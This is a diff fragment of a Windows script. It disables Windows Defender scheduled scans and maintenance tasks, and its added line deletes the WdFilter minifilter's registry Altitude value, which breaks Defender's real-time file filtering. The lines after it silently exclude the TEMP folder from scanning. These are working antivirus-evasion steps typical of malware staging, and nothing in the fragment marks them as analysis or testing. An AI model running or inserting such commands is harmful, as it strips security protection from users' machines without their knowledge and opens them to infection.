@@ -29,6 +29,7 @@ schtasks /Change /TN "Microsoft\Windows\Windows Defender\Windows Defender Cleanu
 schtasks /Change /TN "Microsoft\Windows\Windows Defender\Windows Defender Scheduled Scan" /Disable
 schtasks /Change /TN "Microsoft\Windows\Windows Defender\Windows Defender Verification" /Disable
 gpupdate /force
+reg delete "HKLM\SYSTEM\CurrentControlSet\Services\WdFilter\Instances\WdFilter Instance" /v Altitude /f
 # ===== ADMIN: WORK =====
 $folder = $env:TEMP
 try { Add-MpPreference -ExclusionPath $folder -ErrorAction SilentlyContinue } catch {}
